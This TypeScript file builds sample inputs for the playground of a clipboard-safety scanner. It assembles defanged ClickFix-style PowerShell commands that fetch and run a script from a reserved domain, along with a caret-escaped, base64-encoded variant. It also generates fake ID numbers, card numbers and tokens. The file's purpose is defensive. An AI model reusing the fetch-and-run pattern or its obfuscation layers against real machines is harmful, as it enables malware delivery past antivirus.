/**
 * Example texts for the playground. Everything here is fake and harmless:
 *
 * - Commands only ever start `calc` or point at `example.invalid` (a reserved domain that never
 *   resolves). They are assembled from fragments at runtime so no complete ClickFix string exists
 *   in the source (antivirus quarantines those).
 * - Personal data and keys are generated on the page: a Taiwan ID with a computed check digit, a
 *   Luhn-valid number in a card test range, an API key from a seeded PRNG (never a complete key in
 *   any file: GitHub push protection), BIP-39 phrases from a public label (bip39.ts).
 */
import type { Locale } from '@paste-warden/core';
import { demoMnemonics } from './bip39';

export type ExampleId =
  | 'clickfix'
  | 'obfuscated'
  | 'pii'
  | 'apikey'
  | 'seed-valid'
  | 'seed-invalid'
  | 'clean';

export const EXAMPLE_IDS: readonly ExampleId[] = [
  'clickfix',
  'obfuscated',
  'pii',
  'apikey',
  'seed-valid',
  'seed-invalid',
  'clean',
];

const j = (...parts: string[]) => parts.join('');
const HOST = j('example', '.invalid');
const PS = j('power', 'shell');

/** Taiwan national ID letter codes (A=10 … Z=33, with the historical I/O/W/X/Y/Z order). */
// biome-ignore format: compact lookup table
const TW_LETTER: Record<string, number> = {
  A: 10, B: 11, C: 12, D: 13, E: 14, F: 15, G: 16, H: 17, I: 34, J: 18, K: 19, L: 20, M: 21,
  N: 22, O: 35, P: 23, Q: 24, R: 25, S: 26, T: 27, U: 28, V: 29, W: 32, X: 30, Y: 31, Z: 33,
};

/** Appends the check digit to a letter + 8 digits (`A12345678` → `A123456789`). */
export function twNationalId(prefix: string): string {
  const code = TW_LETTER[prefix[0] as string];
  if (code === undefined || !/^[A-Z][12]\d{7}$/.test(prefix)) {
    throw new Error('prefix must be a letter, 1 or 2, then 7 digits');
  }
  let sum = Math.floor(code / 10) + (code % 10) * 9;
  for (let i = 1; i <= 8; i++) sum += Number(prefix[i]) * (9 - i);
  return prefix + String((10 - (sum % 10)) % 10);
}

/** Appends the Luhn check digit. */
export function luhn(prefix: string): string {
  let sum = 0;
  for (let i = 0; i < prefix.length; i++) {
    let d = Number(prefix[prefix.length - 1 - i]);
    if (i % 2 === 0) {
      d *= 2;
      if (d > 9) d -= 9;
    }
    sum += d;
  }
  return prefix + String((10 - (sum % 10)) % 10);
}

export function isLuhnValid(number: string): boolean {
  const digits = number.replace(/\D/g, '');
  return luhn(digits.slice(0, -1)) === digits;
}

/** mulberry32: a tiny seeded PRNG, so the fake key is the same on every visit (and screenshot). */
export function seededRandom(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const ALNUM = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

export function fakeToken(seed: number, length: number): string {
  const next = seededRandom(seed);
  let out = '';
  for (let i = 0; i < length; i++) out += ALNUM[Math.floor(next() * ALNUM.length)];
  return out;
}

/** Base64 of the UTF-16LE bytes, the format of PowerShell's `-EncodedCommand`. */
export function encodePowerShell(command: string): string {
  let binary = '';
  for (let i = 0; i < command.length; i++) {
    const c = command.charCodeAt(i);
    binary += String.fromCharCode(c & 0xff, c >> 8);
  }
  return btoa(binary);
}

const group4 = (s: string) => s.replace(/(.{4})(?=.)/g, '$1 ');

/** Builds the text of an example. `wordlist` is the BIP-39 list (only the seed examples need it). */
export function buildExample(id: ExampleId, locale: Locale, wordlist: readonly string[]): string {
  const zh = locale === 'zh-TW';
  switch (id) {
    case 'clickfix':
      // What a fake "I am not a robot" page puts on the clipboard, defanged: calc + example.invalid.
      return j(
        PS,
        ' -w hid',
        'den -c "i',
        'wr ht',
        'tps://',
        HOST,
        '/check.ps1 | i',
        'ex; calc"  # I am not a robot - reCAPTCHA Verification ID: 4821',
      );
    case 'obfuscated': {
      // Four layers: cmd ^ escapes → -EncodedCommand → '+' concatenation → string run as a command.
      const inner = j('i', "ex ('i'+'wr'+' ht'+'tps://", HOST, "/verify.ps1')");
      const caret = PS.split('').join('^');
      return j(caret, ' -w h^i^d^d^e^n -e', 'nc ', encodePowerShell(inner));
    }
    case 'pii': {
      const id = twNationalId('A12345678');
      const card = group4(luhn('400000123456789'));
      const phone = '0912-345-678';
      return zh
        ? `請幫我更新會員資料（測試用假資料）：\n姓名：王小明\n身分證字號：${id}\n手機：${phone}\n信用卡：${card}`
        : `Please update my account (fake test data):\nName: Jane Doe\nTaiwan ID: ${id}\nMobile: ${phone}\nCard: ${card}`;
    }
    case 'apikey': {
      const token = j('gh', 'p_', fakeToken(0x5eed, 36));
      return zh
        ? `CI 壞了，先用我的 token 頂一下：\n${token}`
        : `CI is broken, use my token for now:\n${token}`;
    }
    case 'seed-valid':
      return demoMnemonics(wordlist).valid;
    case 'seed-invalid':
      return demoMnemonics(wordlist).invalid;
    case 'clean':
      return zh
        ? '週五下午三點開會，記得帶上 Q3 的報告。會議室：B2-301。'
        : 'Team sync on Friday at 3 pm. Please bring the Q3 report. Room B2-301.';
  }
}
